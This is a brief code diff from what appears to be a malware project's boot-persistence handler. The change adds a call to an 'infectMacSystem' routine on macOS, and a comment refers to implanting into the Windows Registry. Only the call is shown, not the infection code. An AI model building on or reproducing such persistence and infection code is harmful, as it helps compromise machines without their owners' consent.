@@ -62,6 +62,8 @@ class BootPersistanceHandler:
             print("We're on Linux...")
         elif (platform.system().lower() == "darwin"):
             print("We're on Mac OS X...")
+            
+            self.infectMacSystem()
 
     #
     # Implant to Windows Registry
